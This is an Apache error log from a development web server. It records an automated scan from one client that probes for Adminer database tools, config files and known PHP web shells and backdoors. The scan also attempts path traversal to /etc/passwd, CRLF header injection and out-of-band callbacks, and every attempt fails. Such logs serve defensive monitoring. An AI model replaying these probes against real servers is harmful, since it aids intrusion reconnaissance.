[Wed Jul 07 19:01:06.467114 2021] [php7:error] [pid 13706] [client 27.147.202.214:4690] script '/var/www/html/dev.stocktuna.com/ad.php' not found or unable to stat, referer: https://dev.stocktuna.com/
[Wed Jul 07 19:01:06.476689 2021] [php7:error] [pid 13707] [client 27.147.202.214:4686] script '/var/www/html/dev.stocktuna.com/_adminer.php' not found or unable to stat, referer: https://dev.stocktuna.com/
[Wed Jul 07 19:01:07.476452 2021] [php7:error] [pid 13708] [client 27.147.202.214:4691] script '/var/www/html/dev.stocktuna.com/Adminer.php' not found or unable to stat, referer: https://dev.stocktuna.com/
[Wed Jul 07 19:01:07.477207 2021] [php7:error] [pid 13711] [client 27.147.202.214:4703] script '/var/www/html/dev.stocktuna.com/adminer-4.3.1-en.php' not found or unable to stat, referer: https://dev.stocktuna.com/
[Wed Jul 07 19:01:07.487630 2021] [php7:error] [pid 13709] [client 27.147.202.214:4687] script '/var/www/html/dev.stocktuna.com/adminer.php' not found or unable to stat, referer: https://dev.stocktuna.com/
[Wed Jul 07 19:01:07.488371 2021] [php7:error] [pid 13710] [client 27.147.202.214:4688] script '/var/www/html/dev.stocktuna.com/ad.php' not found or unable to stat, referer: https://dev.stocktuna.com/
[Wed Jul 07 19:01:08.887913 2021] [php7:error] [pid 13712] [client 27.147.202.214:4692] script '/var/www/html/dev.stocktuna.com/adminer-4.2.5.php' not found or unable to stat, referer: https://dev.stocktuna.com/
[Wed Jul 07 19:01:09.137310 2021] [php7:error] [pid 13715] [client 27.147.202.214:4694] script '/var/www/html/dev.stocktuna.com/adminer-4.2.5-en.php' not found or unable to stat, referer: https://dev.stocktuna.com/
[Wed Jul 07 19:01:09.142705 2021] [php7:error] [pid 13716] [client 27.147.202.214:4699] script '/var/www/html/dev.stocktuna.com/adminer-4.3.0-mysql-en.php' not found or unable to stat, referer: https://dev.stocktuna.com/
[Wed Jul 07 19:01:09.532777 2021] [php7:error] [pid 13726] [client 27.147.202.214:4721] script '/var/www/html/dev.stocktuna.com/adminer-4.6.1-mysql-en.php' not found or unable to stat, referer: https://dev.stocktuna.com/
[Wed Jul 07 19:01:09.673880 2021] [php7:error] [pid 13713] [client 27.147.202.214:4708] script '/var/www/html/dev.stocktuna.com/adminer-4.4.0-en.php' not found or unable to stat, referer: https://dev.stocktuna.com/
[Wed Jul 07 19:01:09.726059 2021] [php7:error] [pid 13718] [client 27.147.202.214:4718] script '/var/www/html/dev.stocktuna.com/adminer-4.6.0-mysql.php' not found or unable to stat, referer: https://dev.stocktuna.com/
[Wed Jul 07 19:01:09.783205 2021] [php7:error] [pid 13714] [client 27.147.202.214:4705] script '/var/www/html/dev.stocktuna.com/adminer-4.3.1-mysql-en.php' not found or unable to stat, referer: https://dev.stocktuna.com/
[Wed Jul 07 19:01:09.919048 2021] [php7:error] [pid 13727] [client 27.147.202.214:4722] script '/var/www/html/dev.stocktuna.com/adminer-4.6.1-mysql.php' not found or unable to stat, referer: https://dev.stocktuna.com/
[Wed Jul 07 19:01:09.927036 2021] [php7:error] [pid 13723] [client 27.147.202.214:4696] script '/var/www/html/dev.stocktuna.com/adminer-4.2.5-mysql.php' not found or unable to stat, referer: https://dev.stocktuna.com/
[Wed Jul 07 19:01:09.937937 2021] [php7:error] [pid 13728] [client 27.147.202.214:4720] script '/var/www/html/dev.stocktuna.com/adminer-4.6.1-en.php' not found or unable to stat, referer: https://dev.stocktuna.com/
[Wed Jul 07 19:01:09.954035 2021] [php7:error] [pid 13735] [client 27.147.202.214:4724] script '/var/www/html/dev.stocktuna.com/adminer-4.6.2.php' not found or unable to stat, referer: https://dev.stocktuna.com/
[Wed Jul 07 19:01:09.990817 2021] [php7:error] [pid 13719] [client 27.147.202.214:4698] script '/var/www/html/dev.stocktuna.com/adminer-4.3.0-en.php' not found or unable to stat, referer: https://dev.stocktuna.com/
[Wed Jul 07 19:01:10.210927 2021] [php7:error] [pid 13734] [client 27.147.202.214:4701] script '/var/www/html/dev.stocktuna.com/adminer-4.3.0-mysql.php' not found or unable to stat, referer: https://dev.stocktuna.com/
[Wed Jul 07 19:01:10.325102 2021] [http:error] [pid 13764] [client 27.147.202.214:4744] AH02430: Response header 'Location' value of 'https://dev.stocktuna.com/\n.example.com' contains invalid characters, aborting request
[Wed Jul 07 19:01:10.590518 2021] [php7:error] [pid 13737] [client 27.147.202.214:4712] script '/var/www/html/dev.stocktuna.com/adminer-4.5.0-en.php' not found or unable to stat, referer: https://dev.stocktuna.com/
[Wed Jul 07 19:01:10.599214 2021] [php7:error] [pid 13739] [client 27.147.202.214:4706] script '/var/www/html/dev.stocktuna.com/adminer-4.3.1-mysql.php' not found or unable to stat, referer: https://dev.stocktuna.com/
[Wed Jul 07 19:01:10.721624 2021] [php7:error] [pid 13722] [client 27.147.202.214:4709] script '/var/www/html/dev.stocktuna.com/adminer-4.4.0-mysql-en.php' not found or unable to stat, referer: https://dev.stocktuna.com/
[Wed Jul 07 19:01:10.815958 2021] [php7:error] [pid 13729] [client 27.147.202.214:4697] script '/var/www/html/dev.stocktuna.com/adminer-4.3.0.php' not found or unable to stat, referer: https://dev.stocktuna.com/
[Wed Jul 07 19:01:10.884952 2021] [php7:error] [pid 13730] [client 27.147.202.214:4707] script '/var/www/html/dev.stocktuna.com/adminer-4.4.0.php' not found or unable to stat, referer: https://dev.stocktuna.com/
[Wed Jul 07 19:01:11.052093 2021] [php7:error] [pid 13720] [client 27.147.202.214:4714] script '/var/www/html/dev.stocktuna.com/adminer-4.5.0-mysql.php' not found or unable to stat, referer: https://dev.stocktuna.com/
[Wed Jul 07 19:01:11.072222 2021] [php7:error] [pid 13733] [client 27.147.202.214:4717] script '/var/www/html/dev.stocktuna.com/adminer-4.6.0-mysql-en.php' not found or unable to stat, referer: https://dev.stocktuna.com/
[Wed Jul 07 19:01:11.246242 2021] [php7:error] [pid 13738] [client 27.147.202.214:4715] script '/var/www/html/dev.stocktuna.com/adminer-4.6.0.php' not found or unable to stat, referer: https://dev.stocktuna.com/
[Wed Jul 07 19:01:11.620701 2021] [php7:error] [pid 13721] [client 27.147.202.214:4711] script '/var/www/html/dev.stocktuna.com/adminer-4.5.0.php' not found or unable to stat, referer: https://dev.stocktuna.com/
[Wed Jul 07 19:01:11.795180 2021] [php7:error] [pid 13747] [client 27.147.202.214:4758] script '/var/www/html/dev.stocktuna.com/bitrix_server_test.php' not found or unable to stat
[Wed Jul 07 19:01:11.817160 2021] [php7:error] [pid 13732] [client 27.147.202.214:4713] script '/var/www/html/dev.stocktuna.com/adminer-4.5.0-mysql-en.php' not found or unable to stat, referer: https://dev.stocktuna.com/
[Wed Jul 07 19:01:11.825341 2021] [php7:error] [pid 13731] [client 27.147.202.214:4702] script '/var/www/html/dev.stocktuna.com/adminer-4.3.1.php' not found or unable to stat, referer: https://dev.stocktuna.com/
[Wed Jul 07 19:01:11.852301 2021] [php7:error] [pid 13745] [client 27.147.202.214:4740] script '/var/www/html/dev.stocktuna.com/adminer-4.6.2-mysql.php' not found or unable to stat, referer: https://dev.stocktuna.com/
[Wed Jul 07 19:01:11.924825 2021] [php7:error] [pid 13743] [client 27.147.202.214:4726] script '/var/www/html/dev.stocktuna.com/adminer-4.6.2-mysql-en.php' not found or unable to stat, referer: https://dev.stocktuna.com/
[Wed Jul 07 19:01:11.983430 2021] [php7:error] [pid 13725] [client 27.147.202.214:4725] script '/var/www/html/dev.stocktuna.com/adminer-4.6.2-en.php' not found or unable to stat, referer: https://dev.stocktuna.com/
[Wed Jul 07 19:01:12.046848 2021] [php7:error] [pid 13744] [client 27.147.202.214:4719] script '/var/www/html/dev.stocktuna.com/adminer-4.6.1.php' not found or unable to stat, referer: https://dev.stocktuna.com/
[Wed Jul 07 19:01:12.673795 2021] [core:error] [pid 13712] [client 27.147.202.214:4692] AH00126: Invalid URI in request GET /static/../../../../../../../../../../../etc/shells HTTP/1.1
[Wed Jul 07 19:01:12.951420 2021] [php7:error] [pid 13724] [client 27.147.202.214:4695] script '/var/www/html/dev.stocktuna.com/adminer-4.2.5-mysql-en.php' not found or unable to stat, referer: https://dev.stocktuna.com/
[Wed Jul 07 19:01:13.200123 2021] [php7:error] [pid 13709] [client 27.147.202.214:4687] script '/var/www/html/dev.stocktuna.com/opcache.php' not found or unable to stat
[Wed Jul 07 19:01:13.403506 2021] [php7:error] [pid 13734] [client 27.147.202.214:4701] script '/var/www/html/dev.stocktuna.com/opcache.php' not found or unable to stat
[Wed Jul 07 19:01:14.515935 2021] [core:error] [pid 13715] [client 27.147.202.214:4694] AH00126: Invalid URI in request GET /%2e%2e/index.js HTTP/1.1
[Wed Jul 07 19:01:14.843248 2021] [core:error] [pid 13716] [client 27.147.202.214:4699] AH00126: Invalid URI in request GET /%2e%2e/debug.js HTTP/1.1
[Wed Jul 07 19:01:15.177188 2021] [core:error] [pid 13729] [client 27.147.202.214:4697] AH00126: Invalid URI in request GET /%2e%2e/release.js HTTP/1.1
[Wed Jul 07 19:01:15.295363 2021] [php7:error] [pid 13717] [client 27.147.202.214:4716] script '/var/www/html/dev.stocktuna.com/adminer-4.6.0-en.php' not found or unable to stat, referer: https://dev.stocktuna.com/
[Wed Jul 07 19:01:15.472084 2021] [php7:error] [pid 13736] [client 27.147.202.214:4710] script '/var/www/html/dev.stocktuna.com/adminer-4.4.0-mysql.php' not found or unable to stat, referer: https://dev.stocktuna.com/
[Wed Jul 07 19:01:18.348087 2021] [authz_core:error] [pid 13117] [client 27.147.202.214:4352] AH01630: client denied by server configuration: /var/www/html/dev.stocktuna.com/server-status
[Wed Jul 07 19:01:18.830178 2021] [php7:error] [pid 13740] [client 27.147.202.214:4755] script '/var/www/html/dev.stocktuna.com/coredumpcheck.php' not found or unable to stat
[Wed Jul 07 19:01:18.974733 2021] [core:error] [pid 13071] [client 27.147.202.214:4570] AH00126: Invalid URI in request GET @uri1.hit95771103614f2a2.group.bxss.me/ HTTP/1.1
[Wed Jul 07 19:01:19.296418 2021] [http:error] [pid 13763] [client 27.147.202.214:4745] AH02430: Response header 'Location' value of 'https://dev.stocktuna.com/\r\nheadername: headervalue' contains invalid characters, aborting request
[Wed Jul 07 19:01:20.156628 2021] [core:error] [pid 13778] [client 27.147.202.214:4995] AH00126: Invalid URI in request GET .uri3.hit95771103614f2a2.group.bxss.me/ HTTP/1.1
[Wed Jul 07 19:01:20.487035 2021] [http:error] [pid 13071] [client 27.147.202.214:4999] AH02430: Response header 'Location' value of 'https://dev.stocktuna.com/\r\theadername: headervalue' contains invalid characters, aborting request
[Wed Jul 07 19:01:21.054840 2021] [php7:error] [pid 13734] [client 27.147.202.214:5182] script '/var/www/html/dev.stocktuna.com/loader-wizard.php' not found or unable to stat
[Wed Jul 07 19:01:21.085267 2021] [http:error] [pid 13751] [client 27.147.202.214:5268] AH02430: Response header 'Location' value of 'https://dev.stocktuna.com/\nheadername: headervalue' contains invalid characters, aborting request
[Wed Jul 07 19:01:21.699128 2021] [http:error] [pid 13717] [client 27.147.202.214:5505] AH02430: Response header 'Location' value of 'https://dev.stocktuna.com/\rheadername: headervalue' contains invalid characters, aborting request
[Wed Jul 07 19:01:22.316103 2021] [http:error] [pid 13760] [client 27.147.202.214:5578] AH02430: Response header 'Location' value of 'https://dev.stocktuna.com/~\r\nheadername: headervalue' contains invalid characters, aborting request
[Wed Jul 07 19:01:24.406243 2021] [core:error] [pid 13737] [client 27.147.202.214:5825] AH00126: Invalid URI in request GET @bxss.me/rpb.png HTTP/1.1
[Wed Jul 07 19:01:24.568539 2021] [authz_core:error] [pid 13739] [client 27.147.202.214:4706] AH01630: client denied by server configuration: /var/www/html/dev.stocktuna.com/server-status
[Wed Jul 07 19:01:24.973767 2021] [core:error] [pid 13738] [client 27.147.202.214:4921] AH00126: Invalid URI in request GET /sdk/../../../../../../../../../../../../../etc/passwd HTTP/1.1
[Wed Jul 07 19:01:26.411259 2021] [core:error] [pid 13736] [client 27.147.202.214:4984] AH00126: Invalid URI in request GET /../../../../../../../../z/../../../../../../../../../etc/shells HTTP/1.1
[Wed Jul 07 19:01:26.724426 2021] [php7:error] [pid 13741] [client 27.147.202.214:8563] script '/var/www/html/dev.stocktuna.com/cblr3tezz629.php' not found or unable to stat, referer: https://dev.stocktuna.com/
[Wed Jul 07 19:01:33.338295 2021] [authz_core:error] [pid 13708] [client 27.147.202.214:8582] AH01630: client denied by server configuration: /var/www/html/dev.stocktuna.com/.htaccess
[Wed Jul 07 19:01:33.629055 2021] [php7:error] [pid 13739] [client 27.147.202.214:4706] script '/var/www/html/dev.stocktuna.com/apc.php' not found or unable to stat
[Wed Jul 07 19:01:33.994477 2021] [php7:error] [pid 13744] [client 27.147.202.214:8592] script '/var/www/html/dev.stocktuna.com/r57shell.php' not found or unable to stat
[Wed Jul 07 19:01:34.273125 2021] [php7:error] [pid 11947] [client 27.147.202.214:4071] script '/var/www/html/dev.stocktuna.com/r57.php' not found or unable to stat
[Wed Jul 07 19:01:34.380402 2021] [php7:error] [pid 13776] [client 27.147.202.214:8584] script '/var/www/html/dev.stocktuna.com/phpinfo.php' not found or unable to stat
[Wed Jul 07 19:01:34.561200 2021] [php7:error] [pid 11947] [client 27.147.202.214:4071] script '/var/www/html/dev.stocktuna.com/r58.php' not found or unable to stat
[Wed Jul 07 19:01:34.638515 2021] [php7:error] [pid 13708] [client 27.147.202.214:8582] script '/var/www/html/dev.stocktuna.com/webadmin.php' not found or unable to stat
[Wed Jul 07 19:01:34.848078 2021] [php7:error] [pid 11947] [client 27.147.202.214:4071] script '/var/www/html/dev.stocktuna.com/c99shell.php' not found or unable to stat
[Wed Jul 07 19:01:34.965406 2021] [php7:error] [pid 13117] [client 27.147.202.214:4352] script '/var/www/html/dev.stocktuna.com/pi.php' not found or unable to stat
[Wed Jul 07 19:01:35.134245 2021] [php7:error] [pid 11947] [client 27.147.202.214:4071] script '/var/www/html/dev.stocktuna.com/c99.php' not found or unable to stat
[Wed Jul 07 19:01:35.421345 2021] [php7:error] [pid 11947] [client 27.147.202.214:4071] script '/var/www/html/dev.stocktuna.com/nstview.php' not found or unable to stat
[Wed Jul 07 19:01:35.569172 2021] [php7:error] [pid 13750] [client 27.147.202.214:8586] script '/var/www/html/dev.stocktuna.com/php.php' not found or unable to stat
[Wed Jul 07 19:01:35.711465 2021] [php7:error] [pid 11947] [client 27.147.202.214:4071] script '/var/www/html/dev.stocktuna.com/nst.php' not found or unable to stat
[Wed Jul 07 19:01:35.854336 2021] [php7:error] [pid 13750] [client 27.147.202.214:8586] script '/var/www/html/dev.stocktuna.com/i.php' not found or unable to stat
[Wed Jul 07 19:01:36.022104 2021] [php7:error] [pid 11947] [client 27.147.202.214:4071] script '/var/www/html/dev.stocktuna.com/rst.php' not found or unable to stat
[Wed Jul 07 19:01:36.145496 2021] [php7:error] [pid 13750] [client 27.147.202.214:8586] script '/var/www/html/dev.stocktuna.com/test.php' not found or unable to stat
[Wed Jul 07 19:01:36.310130 2021] [php7:error] [pid 11947] [client 27.147.202.214:4071] script '/var/www/html/dev.stocktuna.com/r57eng.php' not found or unable to stat
[Wed Jul 07 19:01:36.432232 2021] [php7:error] [pid 13750] [client 27.147.202.214:8586] script '/var/www/html/dev.stocktuna.com/temp.php' not found or unable to stat
[Wed Jul 07 19:01:36.731986 2021] [php7:error] [pid 13745] [client 27.147.202.214:8585] script '/var/www/html/dev.stocktuna.com/shell.php' not found or unable to stat
[Wed Jul 07 19:01:36.742617 2021] [php7:error] [pid 13750] [client 27.147.202.214:8586] script '/var/www/html/dev.stocktuna.com/info.php' not found or unable to stat
[Wed Jul 07 19:01:37.022898 2021] [php7:error] [pid 13745] [client 27.147.202.214:8585] script '/var/www/html/dev.stocktuna.com/dra.php' not found or unable to stat
[Wed Jul 07 19:01:37.314990 2021] [php7:error] [pid 13750] [client 27.147.202.214:8586] script '/var/www/html/dev.stocktuna.com/r.php' not found or unable to stat
[Wed Jul 07 19:01:37.623853 2021] [php7:error] [pid 13710] [client 27.147.202.214:4688] script '/var/www/html/dev.stocktuna.com/lol.php' not found or unable to stat
[Wed Jul 07 19:01:37.913811 2021] [php7:error] [pid 13710] [client 27.147.202.214:4688] script '/var/www/html/dev.stocktuna.com/zehir.php' not found or unable to stat
[Wed Jul 07 19:01:38.203038 2021] [php7:error] [pid 13710] [client 27.147.202.214:4688] script '/var/www/html/dev.stocktuna.com/c-h.v2.php' not found or unable to stat
[Wed Jul 07 19:01:38.490125 2021] [php7:error] [pid 13710] [client 27.147.202.214:4688] script '/var/www/html/dev.stocktuna.com/php-backdoor.php' not found or unable to stat
[Wed Jul 07 19:01:38.785010 2021] [php7:error] [pid 13710] [client 27.147.202.214:4688] script '/var/www/html/dev.stocktuna.com/simple-backdoor.php' not found or unable to stat
[Wed Jul 07 19:01:50.445712 2021] [authz_core:error] [pid 13753] [client 27.147.202.214:8652] AH01630: client denied by server configuration: /var/www/html/dev.stocktuna.com/.htaccess~
[Wed Jul 07 19:01:50.750027 2021] [authz_core:error] [pid 13753] [client 27.147.202.214:8652] AH01630: client denied by server configuration: /var/www/html/dev.stocktuna.com/.htaccess.old
[Wed Jul 07 19:01:51.039228 2021] [authz_core:error] [pid 13753] [client 27.147.202.214:8652] AH01630: client denied by server configuration: /var/www/html/dev.stocktuna.com/.htaccess.save
[Wed Jul 07 19:02:10.604375 2021] [core:error] [pid 13761] [client 27.147.202.214:14051] AH00126: Invalid URI in request GET /assets/../../../../../../../../z/../../../../../../../../../etc/shells HTTP/1.1
[Wed Jul 07 19:02:10.726834 2021] [php7:error] [pid 13737] [client 27.147.202.214:14080] script '/var/www/html/dev.stocktuna.com/assets/rdhehnyorevc.php' not found or unable to stat, referer: https://dev.stocktuna.com/
[Wed Jul 07 19:02:10.896096 2021] [php7:error] [pid 13775] [client 27.147.202.214:14087] script '/var/www/html/dev.stocktuna.com/assets/css/6svw8vnqpcm9.php' not found or unable to stat, referer: https://dev.stocktuna.com/
[Wed Jul 07 19:02:11.160941 2021] [php7:error] [pid 13709] [client 27.147.202.214:14083] script '/var/www/html/dev.stocktuna.com/assets/js/vy8dbutddpdp.php' not found or unable to stat, referer: https://dev.stocktuna.com/
[Wed Jul 07 19:02:12.119134 2021] [php7:error] [pid 13725] [client 27.147.202.214:14091] script '/var/www/html/dev.stocktuna.com/H61D9RcW.php' not found or unable to stat
[Wed Jul 07 19:02:12.161063 2021] [php7:error] [pid 13761] [client 27.147.202.214:14104] script '/var/www/html/dev.stocktuna.com/app_dev.php' not found or unable to stat
[Wed Jul 07 19:02:12.405034 2021] [php7:error] [pid 13725] [client 27.147.202.214:14091] script '/var/www/html/dev.stocktuna.com/db.php' not found or unable to stat
[Wed Jul 07 19:02:12.730397 2021] [php7:error] [pid 13743] [client 27.147.202.214:14088] script '/var/www/html/dev.stocktuna.com/xmlrpc.php' not found or unable to stat
[Wed Jul 07 19:02:13.005703 2021] [php7:error] [pid 13725] [client 27.147.202.214:14091] script '/var/www/html/dev.stocktuna.com/conf.php' not found or unable to stat
[Wed Jul 07 19:02:13.159782 2021] [php7:error] [pid 13763] [client 27.147.202.214:14097] script '/var/www/html/dev.stocktuna.com/assets/js/apc.php' not found or unable to stat
[Wed Jul 07 19:02:13.575390 2021] [php7:error] [pid 13715] [client 27.147.202.214:14090] script '/var/www/html/dev.stocktuna.com/settings.php' not found or unable to stat
[Wed Jul 07 19:02:14.174460 2021] [php7:error] [pid 13725] [client 27.147.202.214:14091] script '/var/www/html/dev.stocktuna.com/config.php' not found or unable to stat
[Wed Jul 07 19:02:14.415907 2021] [authz_core:error] [pid 13705] [client 27.147.202.214:14085] AH01630: client denied by server configuration: /var/www/html/dev.stocktuna.com/assets/js/.htaccess
[Wed Jul 07 19:02:14.685135 2021] [php7:error] [pid 13443] [client 27.147.202.214:14086] script '/var/www/html/dev.stocktuna.com/assets/js/phpinfo.php' not found or unable to stat
[Wed Jul 07 19:02:14.754905 2021] [php7:error] [pid 13725] [client 27.147.202.214:14091] script '/var/www/html/dev.stocktuna.com/config.inc.php' not found or unable to stat
[Wed Jul 07 19:02:14.907393 2021] [php7:error] [pid 13803] [client 27.147.202.214:14112] script '/var/www/html/dev.stocktuna.com/assets/js/r57shell.php' not found or unable to stat
[Wed Jul 07 19:02:14.994806 2021] [php7:error] [pid 13715] [client 27.147.202.214:14090] script '/var/www/html/dev.stocktuna.com/assets/js/webadmin.php' not found or unable to stat
[Wed Jul 07 19:02:15.034849 2021] [php7:error] [pid 13809] [client 27.147.202.214:14123] script '/var/www/html/dev.stocktuna.com/localconfig.php' not found or unable to stat
[Wed Jul 07 19:02:15.183455 2021] [php7:error] [pid 13803] [client 27.147.202.214:14112] script '/var/www/html/dev.stocktuna.com/assets/js/r57.php' not found or unable to stat
[Wed Jul 07 19:02:15.187925 2021] [php7:error] [pid 13804] [client 27.147.202.214:14113] script '/var/www/html/dev.stocktuna.com/xmlrpc.php' not found or unable to stat
[Wed Jul 07 19:02:15.239611 2021] [php7:error] [pid 13802] [client 27.147.202.214:14109] script '/var/www/html/dev.stocktuna.com/assets/js/pi.php' not found or unable to stat
[Wed Jul 07 19:02:15.429837 2021] [php7:error] [pid 13715] [client 27.147.202.214:14090] script '/var/www/html/dev.stocktuna.com/xmlrpc.php' not found or unable to stat
[Wed Jul 07 19:02:15.459745 2021] [php7:error] [pid 13803] [client 27.147.202.214:14112] script '/var/www/html/dev.stocktuna.com/assets/js/r58.php' not found or unable to stat
[Wed Jul 07 19:02:15.604540 2021] [php7:error] [pid 13744] [client 27.147.202.214:14096] script '/var/www/html/dev.stocktuna.com/configuration.php' not found or unable to stat
[Wed Jul 07 19:02:15.735675 2021] [php7:error] [pid 13803] [client 27.147.202.214:14112] script '/var/www/html/dev.stocktuna.com/assets/js/c99shell.php' not found or unable to stat
[Wed Jul 07 19:02:15.828997 2021] [php7:error] [pid 13801] [client 27.147.202.214:14110] script '/var/www/html/dev.stocktuna.com/xmlrpc.php' not found or unable to stat
[Wed Jul 07 19:02:15.834678 2021] [php7:error] [pid 13802] [client 27.147.202.214:14109] script '/var/www/html/dev.stocktuna.com/assets/js/php.php' not found or unable to stat
[Wed Jul 07 19:02:15.909070 2021] [php7:error] [pid 13759] [client 27.147.202.214:14093] script '/var/www/html/dev.stocktuna.com/xmlrpc.php' not found or unable to stat
[Wed Jul 07 19:02:16.018578 2021] [php7:error] [pid 13803] [client 27.147.202.214:14112] script '/var/www/html/dev.stocktuna.com/assets/js/c99.php' not found or unable to stat
[Wed Jul 07 19:02:16.118044 2021] [php7:error] [pid 13802] [client 27.147.202.214:14109] script '/var/www/html/dev.stocktuna.com/assets/js/i.php' not found or unable to stat
[Wed Jul 07 19:02:16.178688 2021] [php7:error] [pid 13744] [client 27.147.202.214:14096] script '/var/www/html/dev.stocktuna.com/settings.inc.php' not found or unable to stat
[Wed Jul 07 19:02:16.295930 2021] [php7:error] [pid 13803] [client 27.147.202.214:14112] script '/var/www/html/dev.stocktuna.com/assets/js/nstview.php' not found or unable to stat
[Wed Jul 07 19:02:16.400310 2021] [php7:error] [pid 13802] [client 27.147.202.214:14109] script '/var/www/html/dev.stocktuna.com/assets/js/test.php' not found or unable to stat
[Wed Jul 07 19:02:16.405571 2021] [php7:error] [pid 13752] [client 27.147.202.214:14089] script '/var/www/html/dev.stocktuna.com/assets/css/apc.php' not found or unable to stat
[Wed Jul 07 19:02:16.420514 2021] [php7:error] [pid 13801] [client 27.147.202.214:14110] script '/var/www/html/dev.stocktuna.com/xmlrpc.php' not found or unable to stat
[Wed Jul 07 19:02:16.464896 2021] [php7:error] [pid 13744] [client 27.147.202.214:14096] script '/var/www/html/dev.stocktuna.com/global.inc.php' not found or unable to stat
[Wed Jul 07 19:02:16.581261 2021] [php7:error] [pid 13803] [client 27.147.202.214:14112] script '/var/www/html/dev.stocktuna.com/assets/js/nst.php' not found or unable to stat
[Wed Jul 07 19:02:16.720797 2021] [php7:error] [pid 13802] [client 27.147.202.214:14109] script '/var/www/html/dev.stocktuna.com/assets/js/temp.php' not found or unable to stat
[Wed Jul 07 19:02:16.790537 2021] [php7:error] [pid 13744] [client 27.147.202.214:14096] script '/var/www/html/dev.stocktuna.com/database.php' not found or unable to stat
[Wed Jul 07 19:02:16.890967 2021] [php7:error] [pid 13803] [client 27.147.202.214:14112] script '/var/www/html/dev.stocktuna.com/assets/js/rst.php' not found or unable to stat
[Wed Jul 07 19:02:17.020233 2021] [php7:error] [pid 13802] [client 27.147.202.214:14109] script '/var/www/html/dev.stocktuna.com/assets/js/info.php' not found or unable to stat
[Wed Jul 07 19:02:17.060606 2021] [php7:error] [pid 13801] [client 27.147.202.214:14110] script '/var/www/html/dev.stocktuna.com/xmlrpc.php' not found or unable to stat
[Wed Jul 07 19:02:17.271530 2021] [php7:error] [pid 13763] [client 27.147.202.214:14097] script '/var/www/html/dev.stocktuna.com/assets/js/r57eng.php' not found or unable to stat
[Wed Jul 07 19:02:17.380713 2021] [authz_core:error] [pid 13752] [client 27.147.202.214:14089] AH01630: client denied by server configuration: /var/www/html/dev.stocktuna.com/assets/css/.htaccess
[Wed Jul 07 19:02:17.471782 2021] [php7:error] [pid 13807] [client 27.147.202.214:14115] script '/var/www/html/dev.stocktuna.com/database.inc.php' not found or unable to stat
[Wed Jul 07 19:02:17.559737 2021] [php7:error] [pid 13763] [client 27.147.202.214:14097] script '/var/www/html/dev.stocktuna.com/assets/js/shell.php' not found or unable to stat
[Wed Jul 07 19:02:17.655780 2021] [php7:error] [pid 13801] [client 27.147.202.214:14110] script '/var/www/html/dev.stocktuna.com/soap.php' not found or unable to stat
[Wed Jul 07 19:02:17.849459 2021] [php7:error] [pid 13763] [client 27.147.202.214:14097] script '/var/www/html/dev.stocktuna.com/assets/js/dra.php' not found or unable to stat
[Wed Jul 07 19:02:17.883529 2021] [php7:error] [pid 13811] [client 27.147.202.214:14122] script '/var/www/html/dev.stocktuna.com/phpThumb.php' not found or unable to stat
[Wed Jul 07 19:02:17.935381 2021] [php7:error] [pid 11815] [client 27.147.202.214:14102] script '/var/www/html/dev.stocktuna.com/assets/css/phpinfo.php' not found or unable to stat
[Wed Jul 07 19:02:18.136763 2021] [php7:error] [pid 13763] [client 27.147.202.214:14097] script '/var/www/html/dev.stocktuna.com/assets/js/r.php' not found or unable to stat
[Wed Jul 07 19:02:18.238202 2021] [php7:error] [pid 13707] [client 27.147.202.214:14105] script '/var/www/html/dev.stocktuna.com/assets/css/r57shell.php' not found or unable to stat
[Wed Jul 07 19:02:18.246024 2021] [php7:error] [pid 13801] [client 27.147.202.214:14110] script '/var/www/html/dev.stocktuna.com/soap.php' not found or unable to stat
[Wed Jul 07 19:02:18.425702 2021] [php7:error] [pid 13763] [client 27.147.202.214:14097] script '/var/www/html/dev.stocktuna.com/assets/js/lol.php' not found or unable to stat
[Wed Jul 07 19:02:18.560214 2021] [php7:error] [pid 13802] [client 27.147.202.214:14109] script '/var/www/html/dev.stocktuna.com/assets/css/pi.php' not found or unable to stat
[Wed Jul 07 19:02:18.756474 2021] [php7:error] [pid 13809] [client 27.147.202.214:14123] script '/var/www/html/dev.stocktuna.com/assets/js/zehir.php' not found or unable to stat
[Wed Jul 07 19:02:18.871380 2021] [php7:error] [pid 13801] [client 27.147.202.214:14110] script '/var/www/html/dev.stocktuna.com/soap.php' not found or unable to stat
[Wed Jul 07 19:02:18.916885 2021] [php7:error] [pid 13752] [client 27.147.202.214:14089] script '/var/www/html/dev.stocktuna.com/assets/css/webadmin.php' not found or unable to stat
[Wed Jul 07 19:02:19.039494 2021] [php7:error] [pid 13809] [client 27.147.202.214:14123] script '/var/www/html/dev.stocktuna.com/assets/js/c-h.v2.php' not found or unable to stat
[Wed Jul 07 19:02:19.056030 2021] [php7:error] [pid 13707] [client 27.147.202.214:14105] script '/var/www/html/dev.stocktuna.com/assets/css/r57.php' not found or unable to stat
[Wed Jul 07 19:02:19.159211 2021] [php7:error] [pid 13806] [client 27.147.202.214:14114] script '/var/www/html/dev.stocktuna.com/assets/css/php.php' not found or unable to stat
[Wed Jul 07 19:02:19.345882 2021] [php7:error] [pid 13811] [client 27.147.202.214:14122] script '/var/www/html/dev.stocktuna.com/login.php' not found or unable to stat
[Wed Jul 07 19:02:19.358100 2021] [php7:error] [pid 13809] [client 27.147.202.214:14123] script '/var/www/html/dev.stocktuna.com/assets/js/php-backdoor.php' not found or unable to stat
[Wed Jul 07 19:02:19.377860 2021] [php7:error] [pid 13707] [client 27.147.202.214:14105] script '/var/www/html/dev.stocktuna.com/assets/css/r58.php' not found or unable to stat
[Wed Jul 07 19:02:19.488186 2021] [php7:error] [pid 13803] [client 27.147.202.214:14112] script '/var/www/html/dev.stocktuna.com/assets/css/i.php' not found or unable to stat
[Wed Jul 07 19:02:19.503324 2021] [php7:error] [pid 13801] [client 27.147.202.214:14110] script '/var/www/html/dev.stocktuna.com/soap.php' not found or unable to stat
[Wed Jul 07 19:02:19.668830 2021] [php7:error] [pid 13809] [client 27.147.202.214:14123] script '/var/www/html/dev.stocktuna.com/assets/js/simple-backdoor.php' not found or unable to stat
[Wed Jul 07 19:02:19.708729 2021] [php7:error] [pid 13707] [client 27.147.202.214:14105] script '/var/www/html/dev.stocktuna.com/assets/css/c99shell.php' not found or unable to stat
[Wed Jul 07 19:02:19.764273 2021] [php7:error] [pid 13803] [client 27.147.202.214:14112] script '/var/www/html/dev.stocktuna.com/assets/css/test.php' not found or unable to stat
[Wed Jul 07 19:02:20.000567 2021] [php7:error] [pid 13707] [client 27.147.202.214:14105] script '/var/www/html/dev.stocktuna.com/assets/css/c99.php' not found or unable to stat
[Wed Jul 07 19:02:20.040624 2021] [php7:error] [pid 13803] [client 27.147.202.214:14112] script '/var/www/html/dev.stocktuna.com/assets/css/temp.php' not found or unable to stat
